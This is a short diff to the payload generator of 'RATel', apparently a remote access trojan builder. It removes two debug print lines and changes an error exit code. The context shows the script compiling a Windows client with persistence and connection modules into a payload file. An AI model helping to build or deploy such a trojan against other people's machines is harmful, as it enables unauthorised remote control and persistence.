@@ -75,14 +75,14 @@ class GeneratePayload:
         if(self.os == "Linux"):
             #if os is linux <3
             cmd = "i686-w64-mingw32-g++ main.cpp Exec.cpp other.cpp   HandShake.cpp  Connexion.cpp  Persistence.cpp  -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
-            print(cmd)
+            
         elif(self.os == "Windows"):
             cmd = "g++ main.cpp Exec.cpp HandShake.cpp  Persistence.cpp Connexion.cpp other.cpp -o {} -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
         else:
             other.printColor("error","[-] RATel is incompatible with: {}".format(self.os))
             other.printColor("error","[-] please try to restart the RATelgenerator on Windows or Linux.")
             GeneratePayload.error = True
-            exit(0)
+            exit(1)
         
         os.chdir("client/src") #move 
 
@@ -133,7 +133,7 @@ init()
 try:
 
     argv = vars(parser.parse_args())
-    print(argv)
+    
 
     AUTO = bool(argv["auto"])
     PORT = int(argv["PORT"])
